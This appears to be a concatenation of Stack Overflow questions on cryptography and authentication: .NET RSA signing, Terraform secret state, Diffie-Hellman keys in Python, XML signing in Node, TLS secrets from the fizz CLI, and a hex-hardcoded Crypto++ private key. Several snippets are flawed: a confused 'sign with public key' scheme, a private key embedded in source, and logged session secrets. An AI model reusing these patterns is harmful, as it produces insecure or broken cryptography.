<p>I received a comment that worked by setting <code>X509KeyStorageFlags.Exportable</code> when loading a private key now when I SignHash data they are being signHashed with both private and public key but the API where I'm sending data expect data to be signHashed with only public key such that SignHashed data can not be Verify</p>
<pre><code>privateKey.VerifyHash(rgbHash, CryptoConfig.MapNameToOID(&quot;SHA1&quot;), rgbSignature);
</code></pre>
<p>in the API I'm sending to.</p>
<p>When I signHash Using only public key I get error</p>
<blockquote>
<p>Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddleware[1]</p>
<p>An unhandled exception has occurred while executing the request.</p>
<p>System.Security.Cryptography.CryptographicException: Object contains only the public half of a key pair. A private key must also be provided.</p>
</blockquote>
<p>From the above code I get error</p>
<blockquote>
<p>Object contains only the public half of a key pair. A private key must also be provided</p>
</blockquote>
<p>Now I'm asking how can I SignHash data with RSACryptoServiceProvider using only public key and verify response using private key in Windows 10 and .NET 8. I there is a way to achieve the expected results please any help.</p>
<p>Let me provide more code for easy assistance on this case</p>
<pre><code>/** RSACrypto Variables */
    RSACryptoServiceProvider? key = null;
    RSACryptoServiceProvider? privateKey = null;
    string Payload = &quot;Hello Sending sensitive data&quot;;

    /** Load CIGServerCerts */
    X509Certificate2Collection CIGServerCerts = new X509Certificate2Collection();
    CIGServerCerts.Import(_appSettingsHelper.CIGServerCertCertificatePath, null, X509KeyStorageFlags.PersistKeySet);
    if (CIGServerCerts.Count &gt; 0)
    {
      CIGServerCert = CIGServerCerts[0];
      Console.WriteLine(&quot;Certificates found in the specified file.&quot;);
    }


    ServicePointManager.ServerCertificateValidationCallback += new RemoteCertificateValidationCallback(Helper.CustomCertificateValidation);
    if (CIGServerCert != null &amp;&amp; CIGServerCert.PublicKey != null)
    {
      RSA rsaPublicKey = this.CIGServerCert.GetRSAPublicKey();
      key = new RSACryptoServiceProvider();
      key.ImportParameters(rsaPublicKey.ExportParameters(false));
      if (key != null)
      {
        Console.WriteLine(&quot;Key retrieved successfully&quot;);
      }
    }

    /** Load Certificate for Stakeholder */
    X509Certificate2Collection stakeHolderCerts = new X509Certificate2Collection();
    if (stakeHolderCerts != null)
    {
      stakeHolderCerts.Import(_appSettingsHelper.StakeholderCertificatePath, _appSettingsHelper.StakeholderPassword, X509KeyStorageFlags.PersistKeySet);
      Console.WriteLine($&quot;@A There is stakeholder certificate&quot;);
    }

    if (stakeHolderCerts?.Count &gt; 0)
    {
      this.StakeHolderCert = stakeHolderCerts[0];
      Console.WriteLine(&quot;certificates found in the specified file.&quot;);
    }

    RSA rsaPrivateKey = this.StakeHolderCert.GetRSAPrivateKey();
    RSAParameters rsaParams = rsaPrivateKey.ExportParameters(false);
    privateKey = new RSACryptoServiceProvider();
    privateKey.ImportParameters(rsaParams);

    /** Serialize Data */
    if (Payload.Trim().Length == 20)
    {

      Helper.CryptoOutput cryptoOutput = Payload.ToString().EncryptPayload(); // (This is a function that return Key, IV and Payload) works fine
      byte[] inArray = key.Encrypt(cryptoOutput.Key, false);
      string base64String1 = Convert.ToBase64String(key.Encrypt(cryptoOutput.IV, false));
      string base64String2 = Convert.ToBase64String(inArray);
      string payload = cryptoOutput.Payload;
      SHA1Managed shA1Managed = new SHA1Managed();
      byte[] hash = shA1Managed.ComputeHash(Convert.FromBase64String(cryptoOutput.Payload));
      string oid = CryptoConfig.MapNameToOID(&quot;SHA1&quot;);
      string base64String3 = Convert.ToBase64String(privateKey.SignHash(hash, oid));

      string responseXModal = SerializationHelper.CreateDataRequest(
            base64String1,
            base64String2,
            payload,
            base64String3,
            &quot;123.12.13.1&quot;,
            ApiConstant.ID,
            ApiConstant.TIMESTAMP,
            ApiConstant.USER_ID
      );

      byte[] rgbSignature = Convert.FromBase64String(responseXModal.Signature);
      byte[] rgbHash = shA1Managed.ComputeHash(Convert.FromBase64String(responseXModal.Payload));
      var signatureVerification = privateKey.VerifyHash(rgbHash, 
 CryptoConfig.MapNameToOID(&quot;SHA1&quot;), rgbSignature);
      Console.WriteLine($&quot;KEY RESPONSE found in the specified file. {signatureVerification}&quot;);

      if (signatureVerification)
      {

        /** Decrypt Keys */
        byte[] i_IV = privateKey.Decrypt(Convert.FromBase64String(responseXModal.EncryptedCryptoIV), false);
        byte[] i_Key = privateKey.Decrypt(Convert.FromBase64String(responseXModal.EncryptedCryptoIV), false);
      }
    }
    ```


  [1]: https://stackoverflow.com/questions/77993268/how-can-signhash-data-using-rsacryptoserviceprovider-in-dotnet-8?noredirect=1#comment137498917_77993268

</code></pre>
"
"<p>We are implementing a custom provider, and we would like to avoid storing sensitive values in Terraform state. Let's say we have:</p>
<pre><code>resource my_secret_resource {
  secret_value = var.secret_value
}
</code></pre>
<p>We know that it's possible to use <code>StateFunc</code> to store a transformation of this value. Let's say we do this:</p>
<pre><code>&quot;secret_value&quot;: {
  Type:      schema.TypeString,
  StateFunc: func stateFuncEncrypting(v interface{}) string {
    return encrypt(hash(v))   
  },
},
</code></pre>
<p>We don't want to just <code>hash</code>, because it's not very safe, but a good <code>encrypt</code> produces different values each time, thus confusing Terraform:</p>
<pre><code>$ terraform apply

...

╷
│ Error: Provider produced inconsistent final plan
│ 
│ When expanding the plan for my_secret_resource.test1 to include new values learned so far during apply, provider
│ &quot;xxx&quot; produced an invalid new value for .secret_value: was
│ cty.StringVal(&quot;TNwbQAAABBcHGEnvVmb...&quot;),
│ but now
│ cty.StringVal(&quot;xuwrHk5COAAAADAJewY...&quot;).
│ 
│ This is a bug in the provider, which should be reported in the provider's own issue tracker.
</code></pre>
<p>Is there any way to tweak <code>StateFunc</code>, <code>DiffSuppressFunc</code>, <code>CustomizeDiff</code> or other Terraform pieces, to accomplish this?</p>
<hr />
<p>Related posts:</p>
<ul>
<li><a href=""https://stackoverflow.com/questions/66163498/keeping-secrets-out-of-terraform-state"">Keeping secrets out of Terraform state</a></li>
<li><a href=""https://stackoverflow.com/questions/75292022/how-can-i-implement-it-using-diffsuppressfunc"">How can I implement it using DiffSuppressFunc()?</a></li>
</ul>
<p>Related TF issues:</p>
<ul>
<li><a href=""https://github.com/hashicorp/terraform/issues/30469"" rel=""nofollow noreferrer"">https://github.com/hashicorp/terraform/issues/30469</a></li>
<li><a href=""https://github.com/hashicorp/terraform/issues/516"" rel=""nofollow noreferrer"">https://github.com/hashicorp/terraform/issues/516</a></li>
</ul>
"
"<p>I have a C code that generates a DH key pair as a raw byte. Then I send my public key to a python server using TCP/IP socket. My DH public key look like this:</p>
<pre class=""lang-py prettyprint-override""><code>derive_key_dh_public_value = {
    0x46, 0x3b, 0x61, 0x4, 0x74, 0x26, 0x81, 0x71, 0xee, 0xba, 0x8b, 0xe, 0xe, 0x34, 0xd, 0x39,
    0x8f, 0xb3, 0xa1, 0x44, 0x63, 0x19, 0x8f, 0x66, 0x6b, 0x80, 0x48, 0x55, 0x8b, 0x96, 0x65, 0x3c,
    0x4a, 0x69, 0x48, 0xbd, 0x65, 0xa5, 0xa5, 0x5c, 0x9, 0x12, 0x30, 0x86, 0xcd, 0x68, 0x11, 0x24,
    0x6, 0x68, 0xb1, 0x36, 0x47, 0x1a, 0x19, 0xb2, 0x5c, 0xb, 0x92, 0x29, 0x2d, 0xa6, 0x1f, 0x22,
    0xc0, 0x36, 0x4e, 0xcd, 0x1, 0x68, 0xcb, 0xd9, 0xd4, 0x1b, 0xae, 0xf9, 0x4b, 0x70, 0x61, 0x7c,
    0x7c, 0xb8, 0x42, 0xf0, 0xaa, 0xd9, 0x5b, 0xd2, 0x37, 0x84, 0x70, 0x1d, 0x18, 0x4a, 0xd4, 0xf3,
    0xac, 0x95, 0x6e, 0xd7, 0xea, 0x70, 0x66, 0xd6, 0x20, 0x27, 0x27, 0xbe, 0x40, 0x62, 0x96, 0xdb,
    0x6e, 0xa7, 0xc4, 0x7, 0xaa, 0x75, 0x86, 0xb5, 0xc9, 0x44, 0xa1, 0xa8, 0x9f, 0xe0, 0xc6, 0x4d,
    0x71, 0x15, 0x80, 0x83, 0x5, 0x5, 0x15, 0xfc, 0xba, 0x56, 0x52, 0xd4, 0x25, 0xcd, 0x75, 0x88,
    0xcc, 0xce, 0x9d, 0x5e, 0xdf, 0xef, 0xc1, 0x58, 0xfc, 0xc6, 0x91, 0xc3, 0xcd, 0x72, 0xfe, 0xa5,
    0x36, 0xdd, 0x68, 0x90, 0x66, 0xea, 0x38, 0x2a, 0x1a, 0x6, 0xb, 0x38, 0xb5, 0xaf, 0x58, 0x7e,
    0x39, 0x9c, 0x6c, 0xab, 0x1f, 0xd5, 0x0, 0xb4, 0x69, 0x63, 0xa4, 0x8b, 0xa3, 0xf1, 0x1e, 0xef,
    0x97, 0x28, 0x32, 0x7a, 0xd0, 0x1c, 0xa3, 0x5d, 0xf, 0x93, 0xa, 0x6b, 0x90, 0x78, 0x6b, 0xf0,
    0x1d, 0xed, 0xeb, 0x85, 0x46, 0x54, 0x76, 0x32, 0x15, 0xbe, 0x96, 0x8e, 0xe2, 0x70, 0x60, 0x16,
    0xae, 0xf7, 0xe5, 0x29, 0xc3, 0x70, 0xf0, 0x6b, 0x4c, 0xb7, 0xf0, 0x7c, 0x7a, 0xc8, 0xee, 0x38,
    0x7f, 0x5d, 0xf4, 0x28, 0x64, 0x94, 0x59, 0x43, 0xcd, 0x57, 0x87, 0x33, 0x7b, 0xae, 0xee, 0xfe
};
</code></pre>
<p>It is a 2048-bit Diffie-Hellman Public Key. My other part that receives this key in this format is a Python program that already generated its own DH key pair. My question is how can I load this raw byte as a DH public key to derive the shared secret? Any Library is fine.</p>
<p>I tried this but gives me error:</p>
<pre class=""lang-py prettyprint-override""><code>dh_public_key_base64 = base64.b64encode(received_public_key).decode('utf-8')
print(dh_public_key_base64)
received_public_key = serialization.load_der_public_key(dh_public_key_base64, backend=default_backend())
</code></pre>
"
"<p>I am using NodeJS 20.11.1 and Express to create a HTTPS server that would have a route <code>/cert</code>. The idea is that this route will request the client certificate that will be used to sign a document. The idea is that our nation (Bulgaria) uses qualified digital signature. It is basically a smart card that contains a certificate used to identify you in government websites for electronic requests. I am developing a web application for dentists that want to leverage these certificates and submit some data to the national health institute. So my idea is the following - the client (a doctor) inserts their smart card in the PC, opens this route and submits their certificate.</p>
<p>To authenticate with this health system, I have to open a URL <code>https://ptest-auth.his.bg/token</code> (test environment) that will give me an XML document. I have to sign it with the client's certificate and send the signed data to the same URL and it will provide me with accessToken that I can use as an authorization header later in the requests.</p>
<p>So my code right now is this:</p>
<pre><code>import { SignedXml } from &quot;xml-crypto&quot;;
const keyPath = path.join(__dirname, &quot;..&quot;, &quot;..&quot;, &quot;selfsigned.key&quot;);
const certPath = path.join(__dirname, &quot;..&quot;, &quot;..&quot;, &quot;selfsigned.crt&quot;);
const key = fs.readFileSync(keyPath);
const cert = fs.readFileSync(certPath);
const options = {
  key: key,
  cert: cert,
  requestCert: true,
  rejectUnauthorized: false,
};

app.get(&quot;/cert&quot;, async (req: Request, res: Response) =&gt; {
  // Get the digital signature of the doctor
  const clientCert = (req.socket as TLSSocket).getPeerCertificate(true).raw.toString(&quot;base64&quot;);
  // build a PEM certificate
  const match = clientCert.match(/.{0,64}/g);
  const prefix = &quot;-----BEGIN CERTIFICATE-----\n&quot;;
  const postfix = &quot;-----END CERTIFICATE-----&quot;;
  if (!match) {
    return res.status(400).json({
      error: &quot;No client certificate provided&quot;,
    });
  }
  const pemText = prefix + match.join(&quot;\n&quot;) + postfix;
  // Get the XML document
  axios.get(&quot;https://ptest-auth.his.bg/token&quot;)
    .then((response) =&gt; {
      // This is a normal response
    })
    .catch((error) =&gt; {
      // Doing the processing here because the API returns 401 if no certificate is provided
      const data = error.response.data;
      // Sign the document
      const signature = new SignedXml({ privateKey: pemText });
      signature.addReference({
        xpath: &quot;/*&quot;,
        digestAlgorithm: &quot;http://www.w3.org/2001/04/xmlenc#sha512&quot;,
        transforms: [&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;],
      });
      signature.canonicalizationAlgorithm = &quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;;
      signature.signatureAlgorithm = &quot;http://www.w3.org/2001/04/xmldsig-more#rsa-sha512&quot;;
      signature.computeSignature(data);
      const signedData = signature.getSignedXml();
      console.log(signedData);
    });
  res.status(200).json({
    success: true,
    message: &quot;Client certificate&quot;,
    clientCert,
  });
});

https.createServer(options, app).listen(8002, () =&gt; {
  console.log(&quot;listening on port 8002&quot;);
});
</code></pre>
<p>Unfortunately, this gives me an error:</p>
<pre><code>Error: error:1E08010C:DECODER routines::unsupported
    at Sign.sign (node:internal/crypto/sig:128:29)
    at D:\GitHub\dentrino-gql\node_modules\xml-crypto\lib\signature-algorithms.js:51:32
    at RsaSha512.getSignature (D:\GitHub\dentrino-gql\node_modules\xml-crypto\lib\types.js:52:20)
    at SignedXml.calculateSignatureValue (D:\GitHub\dentrino-gql\node_modules\xml-crypto\lib\signed-xml.js:244:42)
    at SignedXml.computeSignature (D:\GitHub\dentrino-gql\node_modules\xml-crypto\lib\signed-xml.js:634:18)
    at D:\GitHub\dentrino-gql\dist\microservices\app.js:118:19
    at process.processTicksAndRejections (node:internal/process/task_queues:95:5) {
  library: 'DECODER routines',
  reason: 'unsupported',
  code: 'ERR_OSSL_UNSUPPORTED'
}
</code></pre>
<p>I have read a lot on this, and I am a noob when it comes to crypto in NodeJS. The main question mark that still remains - is the certificate I am getting sufficient to sign the XML? If so, why is it not working?</p>
<p>Any ideas are appreciated!</p>
"
"<p><strong>Issue:</strong></p>
<ol>
<li>I was getting below error while launching the application.</li>
</ol>
<p><a href=""https://i.stack.imgur.com/TK71f.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/TK71f.png"" alt=""appGyvery"" /></a></p>
"
"<p>I am using the CLI of <a href=""https://github.com/facebookincubator/fizz"" rel=""nofollow noreferrer"">facebook's fizz library</a> to do a handshake with a server. It gives all the data below. However, this library can't send requests, just make TLS handshakes. I would like to send some requests using python over the created session, and kind of &quot;break in&quot; it using the details and secrets of it. Do you think it is even possible to do ? If yes, how / what would be your approach ? Thanks</p>
<p>Don't suggest me any other libraries to do handshakes, or any alternatives to fizz, I can't do other than this way, thanks !</p>
<pre><code>% fizz client -connect www.lego.com:443
I20240217 23:24:25.856494 1956971 FizzClientCommand.cpp:150] Connection established.
I20240217 23:24:25.876019 1956971 FizzClientCommand.cpp:287] Handshake succeeded.
I20240217 23:24:25.876044 1956971 FizzClientCommand.cpp:289]   TLS Version: TLSv1.3
I20240217 23:24:25.876052 1956971 FizzClientCommand.cpp:290]   Cipher Suite:  TLS_AES_256_GCM_SHA384
I20240217 23:24:25.876060 1956971 FizzClientCommand.cpp:291]   Named Group: secp256r1
I20240217 23:24:25.876067 1956971 FizzClientCommand.cpp:293]   Signature Scheme: ecdsa_secp256r1_sha256
I20240217 23:24:25.876075 1956971 FizzClientCommand.cpp:295]   PSK: NotAttempted
I20240217 23:24:25.876082 1956971 FizzClientCommand.cpp:296]   PSK Mode: (none)
I20240217 23:24:25.876089 1956971 FizzClientCommand.cpp:298]   Key Exchange Type: OneRtt
I20240217 23:24:25.876096 1956971 FizzClientCommand.cpp:299]   Early: NotAttempted
I20240217 23:24:25.876102 1956971 FizzClientCommand.cpp:300]   Server Identity: www.lego.com
I20240217 23:24:25.876113 1956971 FizzClientCommand.cpp:302]   Client Identity: (none)
I20240217 23:24:25.876120 1956971 FizzClientCommand.cpp:305]   Certificate Chain:
I20240217 23:24:25.876133 1956971 FizzClientCommand.cpp:309]    0 s:C = DK, L = Billund, O = LEGO System A/S, CN = www.lego.com
I20240217 23:24:25.876149 1956971 FizzClientCommand.cpp:311]      i:C = US, O = DigiCert Inc, CN = DigiCert TLS RSA SHA256 2020 CA1
I20240217 23:24:25.876160 1956971 FizzClientCommand.cpp:309]    1 s:C = US, O = DigiCert Inc, CN = DigiCert TLS RSA SHA256 2020 CA1
I20240217 23:24:25.876169 1956971 FizzClientCommand.cpp:311]      i:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert Global Root CA
I20240217 23:24:25.876242 1956971 FizzClientCommand.cpp:322]   Server Certificate:
-----BEGIN CERTIFICATE-----
MIIGTjCCBTagAwIBAgIQCmGyXJrfj7EPqilth5+dDjANBgkqhkiG9w0BAQsFADBP
MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMSkwJwYDVQQDEyBE
aWdpQ2VydCBUTFMgUlNBIFNIQTI1NiAyMDIwIENBMTAeFw0yMzA3MDUwMDAwMDBa
Fw0yNDA3MTAyMzU5NTlaMFAxCzAJBgNVBAYTAkRLMRAwDgYDVQQHEwdCaWxsdW5k
MRgwFgYDVQQKEw9MRUdPIFN5c3RlbSBBL1MxFTATBgNVBAMTDHd3dy5sZWdvLmNv
bTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABArMnbCzR756C1sfe+PNMhRnQ/fR
KGahzVRXQpAZ1kWdd6VqO06BpsPUc5K0WHOsF6wnOH4Yjff7Oh9w7W95Ws2jggPu
MIID6jAfBgNVHSMEGDAWgBS3a6LqqKqEjHnqtNoPmLLFlXa59DAdBgNVHQ4EFgQU
ExGS09gYJHm6DIphroRtMdn57hMwgZgGA1UdEQSBkDCBjYIMd3d3LmxlZ28uY29t
gghsZWdvLmNvbYINKi51cy5sZWdvLmNvbYIUKi5zbGluZ3Nob3QubGVnby5jb22C
Eyouc2VydmljZXMubGVnby5jb22CDyoubGVnb2hvdXNlLmNvbYINKi5sZWdvY2Ru
LmNvbYIKKi5sZWdvLmNvbYINKi5ldS5sZWdvLmNvbTAOBgNVHQ8BAf8EBAMCB4Aw
HQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMIGPBgNVHR8EgYcwgYQwQKA+
oDyGOmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFRMU1JTQVNIQTI1
NjIwMjBDQTEtNC5jcmwwQKA+oDyGOmh0dHA6Ly9jcmw0LmRpZ2ljZXJ0LmNvbS9E
aWdpQ2VydFRMU1JTQVNIQTI1NjIwMjBDQTEtNC5jcmwwPgYDVR0gBDcwNTAzBgZn
gQwBAgIwKTAnBggrBgEFBQcCARYbaHR0cDovL3d3dy5kaWdpY2VydC5jb20vQ1BT
MH8GCCsGAQUFBwEBBHMwcTAkBggrBgEFBQcwAYYYaHR0cDovL29jc3AuZGlnaWNl
cnQuY29tMEkGCCsGAQUFBzAChj1odHRwOi8vY2FjZXJ0cy5kaWdpY2VydC5jb20v
RGlnaUNlcnRUTFNSU0FTSEEyNTYyMDIwQ0ExLTEuY3J0MAkGA1UdEwQCMAAwggF+
BgorBgEEAdZ5AgQCBIIBbgSCAWoBaAB1AO7N0GTV2xrOxVy3nbTNE6Iyh0Z8vOze
w1FIWUZxH7WbAAABiSNeWPoAAAQDAEYwRAIgO1HsKPDb19zsWcdAGAGRpvU7U5kI
dr8zF6GInvKAxTkCIFhJ0EXCMAzcs6bGUXCULaZOsNT8FCTH9X8RFrX1GOBgAHYA
SLDja9qmRzQP5WoC+p0w6xxSActW3SyB2bu/qznYhHMAAAGJI15ZGwAABAMARzBF
AiAO+mJ8X36wb6XRerKIWqP/cOy6QUq3fLlOQkmNcHo27gIhAMDWb0ZGzhA6FaNj
rOy1Wbi/R8FAuaUb9kGqPdrle2JPAHcA2ra/az+1tiKfm8K7XGvocJFxbLtRhIU0
vaQ9MEjX+6sAAAGJI15YdgAABAMASDBGAiEA71T7gVd1E386o7n+IGhqagqDQxnz
QDZ9N6JAaWp9a3wCIQDrkZPFN1C2P5iN05b3Ip0J1hcRbZWSUtZbKZPb4+9yJzAN
BgkqhkiG9w0BAQsFAAOCAQEAvZHNSCir2TU4u/94QXm7sCYQ3CsmKOZAMfu5mZnr
hpkQMsI8RHrPLmYixOxzRUZSYhi7X9jh1wL5MYU98HqsQOpRkCWMqmPOyXRtSeET
q115w+OCZ2Jq2lJ+m3dDQiyJBST/CkO3Ob+W1GOFONWRX1z21O1wadJMcEpbzXtC
G5HD4SG72B+pQrzpbYKeWSQLisELveCAMAnduk8JbcBMnJ0CI4uIsM+xYN09qbgq
C8gHtYOzGKGYZPqFbUeVb/W+JeYz0y8FgqV6JkEW4uDkxPoIbpVgOsNIEd6uoXXk
eA2xdHXcLDNoZb/ukkvuaJ3M7hPlSw3dnG8ssRs3d+suCw==
-----END CERTIFICATE-----
I20240217 23:24:25.878157 1956971 FizzClientCommand.cpp:339]   Server Certificate Compression: (none)
I20240217 23:24:25.878181 1956971 FizzClientCommand.cpp:343]   ALPN: (none)
I20240217 23:24:25.878190 1956971 FizzClientCommand.cpp:344]   Client Random: 9e0947d7697de8fe9be1774f3686807be14a77f3add93b7554567ce68919b850
I20240217 23:24:25.878203 1956971 FizzClientCommand.cpp:346]   Secrets:
I20240217 23:24:25.878211 1956971 FizzClientCommand.cpp:347]     External PSK Binder: (none)
I20240217 23:24:25.878218 1956971 FizzClientCommand.cpp:348]     Resumption PSK Binder: (none)
I20240217 23:24:25.878226 1956971 FizzClientCommand.cpp:350]     Early Exporter: (none)
I20240217 23:24:25.878232 1956971 FizzClientCommand.cpp:351]     Early Client Data: (none)
I20240217 23:24:25.878239 1956971 FizzClientCommand.cpp:353]     Client Handshake: ca2fef129f8510c1f35897c9e2912e778c67f0beab45d9b8a2abae9c67dea1758f64bf4b03f8a423ca8aa75d983e068a
I20240217 23:24:25.878249 1956971 FizzClientCommand.cpp:355]     Server Handshake: 55b5acbf3a8528489b2d9f32ad215c11432e97ca2324862e7706ceb0bda9fd1ba1b4a0acaba670f6ae7d7e7dbe8fd251
I20240217 23:24:25.878257 1956971 FizzClientCommand.cpp:357]     Exporter Master: 853687a4a9546903cf70ae0638ee918120a5f4515c97519a2ba113b2099a3c15ad6a64ade8502e7579b4f331e0bcea59
I20240217 23:24:25.878263 1956971 FizzClientCommand.cpp:358]     Resumption Master: 7f1d53923729bd1beb934a2a6d83107ae2c57c5ff791c8683882af0e0b6998f112a681d250301ac2dc18f058fd62419d
I20240217 23:24:25.878270 1956971 FizzClientCommand.cpp:360]     Client Traffic: 0fee0101569526c0f1785e0f03c0fe7fc54a6898c9528367a0a0f9169a7c114eb94cb8e0d8f87b325fa714e8d6900296
I20240217 23:24:25.878276 1956971 FizzClientCommand.cpp:361]     Server Traffic: 9588cdfcb3baed643a6e2ac119bad5b84d260ee72d9ed1e7ffdf3cdf0d28565df14bd1a5d1a47be5c767d1a58fdf3e85
</code></pre>
<p>I've looked at the topic of &quot;session resumption&quot;, but didn't find anything interesting.</p>
"
"<p>I need to use an openssl generated key to sign messages via cryptopp lib.</p>
<p>The key generated with:
<code>openssl genrsa -out privatKey.pem 2048</code></p>
<p>and to get rid of the error <code>CryptoPP::BERDecodeErr</code> when loading this key into <code>RSA::PrivateKey</code>, the key was converted from <code>PEM</code> to <code>DER</code> as stated here <a href=""https://stackoverflow.com/questions/9815001/load-pem-encoded-private-rsa-key-in-crypto"">Load PEM encoded private RSA key in Crypto++</a> : <code>openssl pkcs8 -in privatKey.pem -out privatKey.der -topk8 -nocrypt -outform der</code></p>
<p>The code for loading the converted key from the file works successfully:</p>
<pre><code>ByteQueue queue;
FileSource file(&quot;privatKey.der&quot;, true);
file.TransferTo(queue);
queue.MessageEnd();

RSA::PrivateKey rsaPrivate;
rsaPrivate.Load(queue);
</code></pre>
<p>Now I want to hardcode this key directly into the program text. I read its contents through the <code>xxd -p privatKey.der</code> and copied it into the code:</p>
<pre><code>std::string privKeyStr = &quot;308204bd020100300d06092a864886f70d0101010500048204a7308204a3&quot;
&quot;0201000282010100ba077fcaf8908c0b9bfef58f4493c93affb6ca7b2947&quot;
&quot;ad2d066eca92f42be3b8695c1dbb1b30ccc08ae844d503bcd4f8261c4aa2&quot;
&quot;4e07b3d4c20a5c2e651588ca5b167c320b903c11dc178f802698b5ea8ab2&quot;
&quot;a62c853648f985ffc61490c63472a4a2f84299550f58eb3254d822fbaaa4&quot;
&quot;529fba6d6daa9ba32550f2691058f2b34299482adb4012028419261fd01b&quot;
&quot;62d3affbae524d0892776f4147d37bb10079a83c91898e6d42abb939018a&quot;
&quot;6c63055efe0b30ca34f21bd3e5d861dd29ba0f97d05bf4ba8b22ab50db94&quot;
&quot;d14a0bb7ff671ef415e1bdc52aa9fd83140c6de08ec69a66d333f6c1f53d&quot;
&quot;4f9b1245676ba68c20f15cf28dd81b90e7526ee2796aa461020301000102&quot;
&quot;8201006d244d339615a8347f775c368bf370d26e889dcf186ef7093d86ee&quot;
&quot;cebcf6ab09dcb6b0b2bfc727b9a745926caf5eb04c4e7fb6c1f6a9ca35ff&quot;
&quot;09f8ff374b251023d4d354c13804262e4c9c628142832871eb525738689a&quot;
&quot;f3da4c2fb88d1fdc518e8a16c16c185d82bbaab1e084d5c64dd633e43aa3&quot;
&quot;66bf1d3e9d793b6edde0b58e9cd8df8b084cef3656a8fc061eb5464df71a&quot;
&quot;c89684684571951552d342736286fea796f8c2bbd763d8451fad44eab2ac&quot;
&quot;81d852ab968a46cf95e4a5350577c38e856902a37b04da451d63c0542661&quot;
&quot;774caf68b37008cfe6beeeb843cfbc0a68688d91daadf27f507d2cfe526f&quot;
&quot;295ac69ce748e331290d9f77a3f9f46823cde902818100ea41fc3e0e4afb&quot;
&quot;ce2473fa019df29de5a1d804b04378efee0bc9a9f3e064b2aa2b310377ad&quot;
&quot;8bceb88d0a7e1a96a64017e04a05fa74616987de7203adcfddcbc2279474&quot;
&quot;8fc075b498683efb23ead8aa0be06c720f31c2006372e5d9c43d84065bd6&quot;
&quot;b2e75f683378ba6e07573a59dbf5a3875d27a84244402f5aaae407a7eeb7&quot;
&quot;f302818100cb4b9862023585e70334d7d622bf6e3232bfb89a28afef2bd4&quot;
&quot;d2a3888af36a57152c2974e83baa2f63bd005e2cdf90c68ad28a010fda99&quot;
&quot;e4a19159b4164a620e1a99158f190ae47ee2bd3abd66158f07b6469f3c71&quot;
&quot;b2c37aa0c9f2b7e22bc164a8ca95132eed353ccbba9ddf23e82d1ed32508&quot;
&quot;c8f4e6f18c78c702c342fcfb5b02818100a85772e545702d341e8e19833f&quot;
&quot;f631f1eb34496a41928f1909ef89ea6fbeed85cc3414c1d43d3bf8f3a22e&quot;
&quot;acfcc5cc195c5cd59efe33629af908060cc9ec21990cc86a5b437b52a493&quot;
&quot;856f0488a7dacb5e239073cad6176160183d3e00d6f79ad7d708de4f0b6e&quot;
&quot;1ecb230b542b6f1e3ebdeffba7b6b74548c2673c27244f3071028180568b&quot;
&quot;ac27ad4113ec30d5423d8b356bb83b1a9b80256a20abcc42901404f37385&quot;
&quot;f72181d49f39274e5d6b8cc88ad9f24c53b525c325f8ae23431519d72cd6&quot;
&quot;25c0535a706f26fe18205c6eaa9f0ee286ad85cfb2e28c94c9db5eb01a80&quot;
&quot;65ecb2bc238f7abf5beee80725c420896a43e1518a19ee0f7f13022a0710&quot;
&quot;d200467864990281801e82172f07d59df235c7ca403f6c7cfa6c0e85a0c6&quot;
&quot;27f90dcc46c114b6146aa2927ce507b1698938db42a73ec50da8531eda23&quot;
&quot;a4e997a2ab7bfdfce3a963b353e472e7d77bf01c60942b7266640f74189e&quot;
&quot;b974b69c2eefeb522f6024c839738f8620d55b79d3cd3155b51c011602ec&quot;
&quot;64c1af4ce4857b1cba7b21d7d59a7e5ab9&quot;;
</code></pre>
<p>I'm trying to load this hardcoded key from the string via <code>CryptoPP::StringSource</code>:</p>
<pre><code>ByteQueue queue;
StringSource str(privKeyStr, true);
str.TransferTo(queue);
queue.MessageEnd();

RSA::PrivateKey rsaPrivate;
rsaPrivate.Load(queue);
</code></pre>
<p>but I'm getting the exception <code>CryptoPP::BERDecodeErr</code></p>
<p>How to do it correctly?</p>
"
"<p>This Below is the String using Tink AESGCM</p>
<pre><code># com.google.crypto.tink.proto.KeysetInfo@ba8523ee
key_info {
  key_id: 980166534
  output_prefix_type: TINK
  output_prefix_type_value: 1
  status: ENABLED
  status_value: 1
  type_url: &quot;type.googleapis.com/google.crypto.tink.AesGcmKey&quot;
}
primary_key_id: 980166534
</code></pre>
<p>I am unable to convert it in KeySetHandle</p>
<p>Below is the code What i have tried but not getting possible results always showing error on Base64</p>
<pre><code>fun createKeysetHandleFromString(serializedKeysetInfo: String): KeysetHandle {
        try {
            val keysetBytes = Base64.getDecoder().decode(serializedKeysetInfo.toByteArray())

            val keyset = Keyset.parseFrom(keysetBytes)

            return fromKeyset(keyset)
        } catch (e: Exception) {
            e.printStackTrace()
            throw IllegalArgumentException(&quot;Error creating KeysetHandle from string: ${e.message}&quot;)
        }
    }
</code></pre>
<p>Error:
creating KeysetHandle from string: Illegal base64 character 23</p>
"
"<p>I cannot currently instantiate a new RecaptchaVerifier. I am running the parent Sign-In page on a Vite dev server connected to the Firebase emulator suite. Current firebase version in package.json is 10.8.0.</p>
<p>// firebaseModular.js</p>
<pre><code>const mainConfig = {
  apiKey: import.meta.env.VITE_API_KEY,
  authDomain: import.meta.env.VITE_AUTH_DOMAIN,
  projectId: import.meta.env.VITE_PROJECT_ID,
  storageBucket: import.meta.env.VITE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.VITE_MESSAGING_SENDER_ID,
  appId: import.meta.env.VITE_APP_ID,
  measurementId: import.meta.env.VITE_MEASUREMENT_ID,
};

export const firebaseApp = initializeApp(mainConfig, &quot;modular&quot;);
export const auth = getAuth(firebaseApp);
getAuth(firebaseApp).settings.appVerificationDisabledForTesting = true;
// auth.settings.appVerificationDisabledForTesting = true;
</code></pre>
<p>// SignInForm.js</p>
<pre><code>import { auth } from &quot;../../constants/firebaseModular&quot;;
import { signInWithEmailAndPassword, RecaptchaVerifier } from &quot;firebase/auth&quot;;

const SignInForm = () =&gt; {
  ...
